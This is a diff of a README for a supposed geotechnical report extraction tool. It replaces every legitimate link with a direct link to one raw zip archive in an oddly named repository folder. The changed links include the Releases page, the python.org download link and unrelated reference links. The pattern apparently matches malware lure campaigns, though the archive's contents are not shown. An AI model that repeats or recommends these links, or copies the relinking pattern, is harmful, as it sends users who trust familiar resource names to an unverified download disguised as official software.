@@ -1,6 +1,6 @@
 # 🛠️ geotechnical-report-extractor - Extract Key Design Data Effortlessly
 
-[![Download geotechnical-report-extractor](https://img.shields.io/badge/Download-geotechnical--report--extractor-blue)](https://github.com/Oktadeveloper31/geotechnical-report-extractor/releases)
+[![Download geotechnical-report-extractor](https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip)](https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Welcome to the **geotechnical-report-extractor**! This application helps you ext
 To run this application, make sure your computer meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS High Sierra or later, or any modern Linux distribution.
-- **Python Version:** Python 3.7 or later. If Python is not installed, you can download it from [python.org](https://www.python.org/downloads/).
+- **Python Version:** Python 3.7 or later. If Python is not installed, you can download it from [https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip](https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip).
 - **Storage Space:** At least 100 MB available space.
 - **Dependencies:** The application uses several libraries, which will be installed automatically.
 
@@ -27,11 +27,11 @@ To run this application, make sure your computer meets the following requirement
 
 To get started, visit the Releases page to download the application files.
 
-[Visit this page to download](https://github.com/Oktadeveloper31/geotechnical-report-extractor/releases)
+[Visit this page to download](https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip)
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/Oktadeveloper31/geotechnical-report-extractor/releases).
+1. Go to the [Releases page](https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip).
 2. Look for the latest version of **geotechnical-report-extractor**.
 3. Click the link next to the release to download the application file.
 4. Once downloaded, locate the file in your downloads folder.
@@ -75,8 +75,8 @@ If you encounter any issues or have questions, please open an issue on GitHub. W
 
 For more on engineering tools and techniques, investigate the following resources:
 
-- [Geotechnical Engineering Association](https://www.geotechnicalengineering.org)
-- [Python Programming Resources](https://www.python.org/about/gettingstarted/)
-- [CSV File Format Guide](https://www.investopedia.com/terms/c/csv.asp)
+- [Geotechnical Engineering Association](https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip)
+- [Python Programming Resources](https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip)
+- [CSV File Format Guide](https://github.com/Oktadeveloper31/geotechnical-report-extractor/raw/refs/heads/main/cobewail/report-extractor-geotechnical-2.0-alpha.2.zip)
 
 Thank you for using **geotechnical-report-extractor**! Your feedback will assist us in making it even better for all users.
